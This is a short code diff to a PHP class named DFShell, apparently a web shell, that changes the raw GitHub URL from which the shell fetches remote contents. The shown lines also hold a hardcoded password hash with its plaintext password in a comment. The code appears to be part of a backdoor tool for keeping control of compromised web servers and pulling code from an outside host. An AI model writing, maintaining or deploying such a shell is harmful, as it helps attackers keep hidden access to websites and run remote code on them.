@@ -39,7 +39,7 @@ class DFShell{
     private $error   = false;   
 
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
-    static protected $remote_url = "https://raw.githubusercontent.com/Ap0dexMe0/DFS/refs/heads/main/contents";
+    static protected $remote_url = "https://raw.githubusercontent.com/Ap0dexMe0/DFS/main/contents";
     
     public function __construct(){
         $_SESSION['need_update'] = false;
